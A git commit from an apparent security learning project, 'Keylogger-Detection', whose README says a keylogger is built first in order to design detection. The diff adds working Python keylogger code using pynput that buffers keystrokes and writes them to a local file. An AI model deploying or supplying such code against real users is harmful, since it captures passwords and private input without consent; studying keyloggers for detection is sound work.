21e8c6e4e8b1d69b4b2fa1beda295eecae506330
ProjectPentest <ProjectPentest@proton.me>
2025-04-17 11:35:29 +0200

    Develop basic functionality of keylogger

--- README.md
+++ README.md
@@ -1,1 +1,6 @@
 # Keylogger-Detection
+
+## Objective
+
+The Keylogger-Detection project is aimed to enhance the understanding of keyloggers, their functionality and behavior in order to build effective mechanisms for detection and prevention. By first developing a keylogger, the project aims to gain insights into how these tools operate, including how they capture keystroke data, manage buffers, and interact with system resources. This hands-on approach should provide intake on identifying signature traits and patterns which make keyloggers detectable.
+In the second stage the project focuses on constructing robust defense systems capable of recognizing keylogger activity. This project contributes to the broader goal of protecting sensitive information from malicious actors by enabling proactive defense strategies.
--- keylogger.py
+++ keylogger.py
@@ -1,35 +1,39 @@
-# -*- coding: utf-8 -*-
+from pynput.keyboard import Key, Listener, HotKey
 
-from pynput import keyboard
-import os
+special_keys = {
+    Key.enter: '\n',
+    Key.tab: '\t',
+    Key.space: ' '
+}   
+buffer = []
 
-def on_press_log(key):
+def on_press(key) -> bool:
     try:
-        with open("keyfile.txt", 'a', encoding="utf-8") as logkey:
-            if hasattr(key, 'char') and key.char:
-                logkey.write(key.char)
-            elif key == keyboard.Key.enter:
-                logkey.write(f"[{key}]\n")
-            elif key == keyboard.Key.backspace:
-                logkey.write(f"[{key}]")
-            elif key == keyboard.Key.space:
-                logkey.write(' ')
-            elif key == keyboard.Key.shift or key == keyboard.Key.esc:
-                logkey.write('')
-            else:
-                logkey.write(f"[{key}]")
+        if hasattr(key, 'char') and key.char:
+           buffer.append(key.char)
+        elif key in special_keys.keys():
+            buffer.append(special_keys.get(key))
+        elif key == Key.backspace or key == Key.delete:
+            buffer.pop()
+    except AttributeError as e:
+        print(f"AttributeError: {e}")
+
+def on_release(key) -> bool:
+    try: 
+        if key == Key.enter:
+            with open("keyfile.txt",'a',encoding="utf-8") as log:
+                for char in buffer:
+                    log.write(char)
+                print(buffer)
+                buffer.clear()
+    except Exception:
+        pass
     
-    except AttributeError as attributeError:
-        print(f"Error logging {key.char}: {attributeError}")
-        
-    if key == keyboard.Key.esc:
-        return False
-
-
+    if key == Key.esc:
+        return False   
 
 def main():
-    print("Starting key listener. Press 'ESC' to stop.")
-    with keyboard.Listener(on_press=on_press_log) as listener:
+    with Listener(on_press=on_press,on_release=on_release) as listener:
         listener.join()
         
 if __name__ == "__main__":
